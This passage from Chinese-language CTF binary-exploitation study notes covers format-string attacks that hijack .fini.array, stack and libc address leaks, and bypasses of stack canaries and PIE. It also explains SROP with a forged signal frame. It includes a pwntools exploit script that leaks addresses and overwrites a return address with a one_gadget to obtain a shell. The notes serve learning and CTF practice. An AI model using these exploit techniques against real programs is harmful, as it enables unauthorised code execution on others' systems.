...
* 注意：试图先通过%num$n写出一个地址，同一个格式串中访问写出的地址，是不可行的
...
* 思路
  ...
  * 另一个问题，不能传入地址写，那我们想要一次写8byte比较难，一般是写1byte或者2byte，如果被写入的内存，本身的高位符合我们的要求，那我们的步骤可以减少
...
* 由于主程序无system，无法选择直接劫持got调用system的打法
* 还是选择修改`.fini.array`
...
# %40$p获取栈地址,%43$p获取到栈上保存的返回到__libc_start_main_243的地址，在这之前栈上还有一些关于标准输出的地址，之后学习到堆的时候再深究
payload = b'%40$p%43$p'
align_len = (16 - len(payload))%16
payload+=b'a'*align_len
numb_written=14+14+align_len
payload+=fmtstr_payload(8, {fini_array :main_addr} , numbwritten = numb_written)
d=b'input:'
pause()
io.sendlineafter(d,payload)

io.recvuntil(b'0x')  # 读到第一个地址开头
stack_leak = int(io.recv(12),16)
log.info("stack_leak:"+hex(stack_leak))
__libc_start_main_243 = int(io.recv(14)[2:],16)
log.info("__libc_start_main_243:"+hex(__libc_start_main_243))
ret_main_addr = stack_leak - 232   # 这里的232是通过调试计算出的栈偏移
libc_addr = __libc_start_main_243 - 243 - __libc_start_main
rdi_pop_ret_addr = rop.rdi.address
ret_addr = rop.ret.address  # 调试exp的过程中，发现参数传递和system都没有问题，但是还是打不成功，查询资料发现，x64下，call函数之后要求rsp 16位对齐，这里额外ret一下对齐字节
...
pause()
# 格式化字符串过长，报错，这里原因未知
# payload2 = fmtstr_payload(6, {ret_main_addr:ret_addr, ret_main_addr+8 :rdi_pop_ret_addr,(ret_main_addr+8+8):bin_sh_addr,(ret_main_addr+16+8):system_addr})
# io.sendlineafter(d,payload2)

# 这里使用payload较短的one_gadget
one_gadget = libc_addr+0xe3b01
payload2 = fmtstr_payload(6,{ret_main_addr:one_gadget})
io.sendlineafter(d,payload2)
...
![img](./images/894406_WVMSWDYAESR8GZ2.jpg)

* 补充这两张图为了说明两点
  * .fini.array的调用
  * main是被libc中`__libc_start_main`调用，这意味着我们通过泄露栈上的数据，也可以获取到libc的基址

#### 示例8-只能打一次的格式化字符串 有PIE 无system .init_array可写（**NO RELRO**）

* 在有pie的情况下，一次格式化字符串就没办法打了，没有地方可以写入地址以劫持控制流
  * 栈上返回地址无法直接覆盖，得知栈地址需要先泄露
  * 主程序中的函数指针、全局变量也无法覆盖，因为没有主程序偏移地址
* 结合无PIE的做法，先泄露所需信息，并劫持一次控制流，达成二次输入
* 如何劫持控制流呢？
...
例子参见example.md中的ciscn_2019_s_3
...
; ds:0x804c014为[0x804c014]，0x804c014是存储write的got表项地址
; 在第一次调用前，这个GOT条目中存储的地址并不是write在共享库中的实际地址，而是指向 PLT 自身的一个特殊指令
...
* 编译时确定要保护的函数，在汇编代码中插入写入canary和检查canary的指令
* 调用函数时，在栈帧中插入随机的canary，在返回地址前，缓冲区覆盖返回地址必定要覆盖canary，通过检查canary判断是否进行了溢出攻击
* 如何突破
  * 信息泄露，泄露canary
  * 某些版本gcc存在漏洞，canary可预测 
  * 爆破 fork
  * stack smashing
  * 劫持 __stack_chk_fail
  * TLS
...
##### stack smashing(2.23及以前)

* 能想到的场景，只有ctf里读一下flag；一些沙箱环境中读取一些值
* 在2.23前的canary机制存在一个缺陷，__stack_chk_fail会打印文件名，通过篡改栈上的数据，达成泄露内存信息的目的
...
>当一个进程收到信号（如 `SIGALRM`）或执行 `sigreturn` 系统调用时，会执行如下过程：
>
>**保存上下文：** 内核会将当前所有寄存器的状态（RIP, RSP, RAX, RDI...）压入用户态栈中。这块区域被称为 **Signal Frame**。
>
>**执行处理函数：** 运行对应的信号处理程序。
>
>**恢复上下文：** 处理完后，进程执行 `sigreturn` 系统调用。此时，内核会从栈上弹出之前保存的 Signal Frame，并**无条件地**将这些值直接还原到硬件寄存器中。
>
>**SROP 的精髓在于：** 只要我们能通过栈溢出控制栈上的数据，我们就可以**手动伪造一个 Signal Frame**。当我们触发 `sigreturn` 调用时，内核就会按照我们伪造的数据，把 `RAX` 设为 `59` (execve)，把 `RDI` 设为 `/bin/sh` 的地址，把 `RIP` 设为 `syscall` 指令的地址。
>
>SROP 的核心思想是利用**操作系统处理信号的机制**，只要是运行 Linux（或类 Unix 系统）且支持信号异步处理的架构，理论上都受到 SROP 的威胁。

使用条件：

* 能够劫持控制流到syscall sigreturn（如果没有pop rax的gadget，可以考虑通过返回值控制）调用号或者sigreturn（即触发sigreturn)
* 知道需要调用的代码的地址和参数地址（例如execve("/bin/sh",0,0)的函数和参数地址）
* 可以在栈上伪造**Signal Frame**

此外上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可：

- 控制栈指针
- 把原来 rip 指向的`syscall` gadget 换成`syscall; ret` gadget

![signal2-stack](./images/srop-example-2.png)

![gadget1](./images/srop-gadget-1.png)
